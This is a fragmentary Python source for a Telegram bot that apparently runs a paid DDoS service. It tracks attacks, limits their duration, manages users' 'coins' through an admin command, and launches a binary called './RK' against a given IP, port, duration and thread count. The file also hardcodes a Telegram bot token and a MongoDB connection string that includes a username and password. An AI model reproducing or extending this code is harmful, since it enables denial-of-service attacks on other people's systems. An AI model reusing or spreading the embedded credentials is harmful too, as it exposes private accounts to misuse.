...
current_attack = None
attack_history = [] 
TELEGRAM_BOT_TOKEN = '7519734348:AAFoQEvymQXUcyhqSYPztIE9cwCiwp-ZGcU:'
ADMIN_USER_ID = 708030615
MONGO_URI = "mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal"
DB_NAME = "zoya"
COLLECTION_NAME = "users"
attack_in_progress = False
ATTACK_TIME_LIMIT = 280
...
async def noob(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    ...
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Incorrect usage! Use: /noob <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./RK {ip} {port} {duration} {threads}"
